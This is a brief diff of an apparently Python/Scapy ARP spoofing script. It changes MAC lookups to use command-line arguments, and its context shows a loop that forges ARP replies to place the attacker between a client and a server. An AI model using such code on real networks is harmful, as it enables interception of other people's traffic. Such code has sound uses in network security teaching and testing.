@@ -11,8 +11,8 @@ print("poisoning...")
 
 broadcast = "ff:ff:ff:ff:ff:ff"
 my_mac = get_if_hwaddr("eth0")
-server_mac = getmacbyip(server_ip)
-client_mac = getmacbyip(client_ip)
+server_mac = getmacbyip(args.server_ip)
+client_mac = getmacbyip(args.client_ip)
 def poison():
     while True:
         packet1 = Ether(src=my_mac, dst=broadcast) /ARP(op = 2, psrc=server_ip, hwsrc=my_mac, pdst=client_ip, hwdst=client_mac)
